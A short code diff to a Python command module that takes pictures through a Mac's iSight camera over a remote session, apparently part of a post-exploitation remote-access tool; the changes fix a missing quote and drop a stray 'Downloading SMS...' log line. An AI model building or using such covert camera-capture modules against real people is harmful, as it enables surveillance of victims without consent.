@@ -25,7 +25,7 @@ class command:
     def __init__(self):
         self.name = "picture"
         self.description = "Take picture through iSight."
-	self.usage = "Usage: picture <local_path>
+	self.usage = "Usage: picture <local_path>"
         self.type = "native"
 
     def run(self,session,cmd_data):
@@ -65,7 +65,6 @@ class command:
 			if os.path.isdir(rp):
 			    pr = os.path.split(dest)[0]
                             rp = os.path.split(dest)[1]
-                            h.info_general("Downloading SMS...")
 			    h.info_general("Taking picture...")
 			    response = json.loads(session.send_command(cmd_data))
 			    try:
